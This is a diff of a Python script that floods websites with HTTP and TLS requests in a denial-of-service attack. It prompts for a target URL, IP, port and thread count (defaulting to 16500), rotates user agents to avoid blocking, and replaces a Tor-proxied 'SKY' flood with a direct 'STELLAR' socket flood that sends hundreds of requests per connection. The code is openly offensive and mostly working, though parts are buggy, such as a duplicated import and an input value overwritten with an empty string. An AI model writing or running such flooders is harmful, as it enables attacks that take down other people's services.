@@ -1,12 +1,12 @@
 import threading
+import threading
 import requests
 import random
 import os
 import time
-import socks
 import socket
-from urllib.parse import urlparse
 import ssl
+from urllib.parse import urlparse
 
 os.system('clear')
 print("POST Method is currently being fixed and it is error right now, please use GET instead.")
@@ -17,6 +17,21 @@ logo = """
 """
 print(logo)
 
+print("Main Layer")
+# Variables for STELLAR attack
+url_stellar = input("[+] Enter a URL for STELLAR attack: ")
+timer_stellar = input("[+] Enter the attack timer for STELLAR (in seconds): ")
+threads_stellar = input("[+] Enter the number of threads for STELLAR: ")
+print("Additional Layer:")
+# Variables for existing attack
+url = input("[+] Enter a URL to attack: ")
+ip = input("[+] Enter the target IP address: ")
+port = input("[+] Enter the target port (default: 80): ")
+numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
+method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
+print("[Check Traffic!]")
+time.sleep(0.5)
+
 # Variables
 url = ""
 ip = ""
@@ -24,18 +39,6 @@ port = ""
 threads = ""
 method = ""
 maxThreads = 35999
-
-url = input("[+] Enter a URL to attack: ")
-ip = input("[+] Enter the target IP address: ")
-port = input("[+] Enter the target port (default: 80): ")
-numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
-method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
-print("[!] additional prompt, please fill this. ( Theres 2 different attack )")
-SKY_url = input("[+] Enter a URL for SKY attack: ")
-SKY_timer = input("[+] Enter the duration for SKY attack (in seconds): ")
-SKY_threads = input("[+] Enter the number of threads for SKY attack: ")
-print("[Check Traffic!]")
-time.sleep(0.5)
 
 if port == "":
     port = 80
@@ -96,44 +99,6 @@ USER_AGENT_PARTS = {
     }
 }
 
-# SOCKS5 Proxy Configuration
-socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-socket.socket = socks.socksocket
-
-def LaunchSKY(url, timer):
-    proxy = random.choice(proxies).strip().split(":")
-    timelol = time.time() + int(timer)
-    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
-    req += "Cache-Control: no-cache\r\n"
-    req += "User-Agent: " + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + "\r\n"
-    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-    req += "Sec-Fetch-Site: same-origin\r\n"
-    req += "Sec-GPC: 1\r\n"
-    req += "Sec-Fetch-Mode: navigate\r\n"
-    req += "Sec-Fetch-Dest: document\r\n"
-    req += "Upgrade-Insecure-Requests: 1\r\n"
-    req += "Connection: Keep-Alive\r\n\r\n"
-    while time.time() < timelol:
-        try:
-            s = socks.socksocket()
-            s.connect((str(urlparse(url).netloc), int(443)))
-            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext()
-            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
-            s.send(str.encode(req))
-            try:
-                for _ in range(100):
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-            except:
-                s.close()
-        except:
-            s.close()
-
-def attackSKY(url, timer, threads):
-    for i in range(int(threads)):
-        threading.Thread(target=LaunchSKY, args=(url, timer)).start()
-
 def attack(threadNum):
     session = requests.Session()
     session.headers.update(headers)
@@ -155,17 +120,48 @@ def flood_url():
         user_agent = ' '.join([random.choice(USER_AGENT_PARTS['platform'][k]) for k in USER_AGENT_PARTS['platform']])
         user_agent += ' (' + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + ')'
         headers['User-Agent'] = user_agent
-        time.sleep(0.1)  # Added delay to reduce the rate of requests and avoid being blocked
+        time.sleep(0.1)  # Added delay to reduce rate of requests and avoid being blocked
         requests.get(url, headers=headers)
+
+def attackSTELLAR(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()
+
+def LaunchSTELLAR(url, timer):
+    timelol = time.time() + int(timer)
+    req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += "User-Agent: " + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(urlparse(url).netloc), int(443)))
+            ctx = ssl.create_default_context()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
 
 # Mulai ( start flooding )
 for i in range(numberOfThreads):
     threading.Thread(target=attack, args=(i,)).start()
 threading.Thread(target=flood_url).start()
 
-# Start SKY attack
-if SKY_url and SKY_timer and SKY_threads:
-    threading.Thread(target=attackSKY, args=(SKY_url, SKY_timer, SKY_threads)).start()
+# Additional stellar attack
+attackSTELLAR(url_stellar, timer_stellar, threads_stellar)
 
 # NOTE
 """
